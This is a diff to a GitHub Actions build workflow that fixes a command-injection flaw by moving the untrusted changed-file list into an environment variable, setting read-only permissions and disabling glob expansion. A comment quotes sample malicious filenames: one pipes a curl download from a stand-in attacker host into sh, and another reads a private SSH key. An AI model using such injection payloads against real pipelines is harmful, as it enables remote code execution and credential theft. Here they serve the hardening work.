@@ -2,6 +2,14 @@ name: Build
 on:
   pull_request:
   merge_group:
+
+# Least privilege: this workflow only reads the repository. Without an explicit
+# block the job inherits the repository default, which on many repositories is
+# still write access to contents, packages, issues and more. `merge_group` runs
+# are especially sensitive because they execute with base-branch privileges.
+permissions:
+  contents: read
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -16,12 +24,43 @@ jobs:
         uses: step-security/changed-files@v45.0.1
 
       - name: Check changed files
+        env:
+          # The changed-file list is pull-request-author controlled. Passing it
+          # through the environment means the shell only ever sees it as data.
+          #
+          # Previously it was interpolated directly into the run block, so the
+          # runner assembled a script out of untrusted text: a legal git filename
+          # such as `a;curl -s attacker.example/x|sh;b.json` or
+          # `$(cat ~/.ssh/id_rsa).json` was expanded before bash parsed the
+          # script and therefore executed as a command, with the workflow token
+          # and the whole checkout in reach. Environment expansion happens after
+          # parsing, so metacharacters in the value can no longer become syntax.
+          ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
         run: |
-          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
-            ./gradlew clean run --args="verbose singleChainCheck $file"
+          set -euo pipefail
+          # Disable pathname expansion: a filename containing * or ? must be
+          # forwarded verbatim, not expanded against the working tree.
+          set -f
+
+          if [ -z "${ALL_CHANGED_FILES// /}" ]; then
+            echo "No changed files to check."
+            exit 0
+          fi
+
+          # `clean` is run once here rather than once per changed file. The
+          # previous `./gradlew clean run` inside the loop discarded the build
+          # output and recompiled the entire project on every iteration, so a
+          # pull request touching N chain files paid N full cold builds instead
+          # of one. The checked state is identical: the loop still starts from a
+          # clean build directory.
+          ./gradlew clean
+
+          for file in $ALL_CHANGED_FILES; do
+            echo "::group::singleChainCheck $file"
+            ./gradlew run --args="verbose singleChainCheck $file"
+            echo "::endgroup::"
           done
 
       - name: Build
         run: |
           ./gradlew run
-
